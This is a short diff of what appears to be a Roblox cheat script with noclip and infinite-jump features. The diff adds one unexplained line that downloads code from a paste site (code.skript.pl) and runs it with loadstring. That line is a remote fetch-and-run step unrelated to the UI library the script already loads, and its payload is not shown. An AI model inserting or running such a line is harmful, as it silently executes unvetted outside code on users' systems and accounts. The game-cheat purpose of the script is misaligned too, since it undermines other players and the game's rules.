@@ -1,6 +1,7 @@
 local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
 local uis = game:GetService("UserInputService")
 local ts = game:GetService("TeleportService")
+loadstring(game:HttpGet("https://code.skript.pl/q1l27scy/raw"))()
 
 local noclip
 local inf_jump_connection
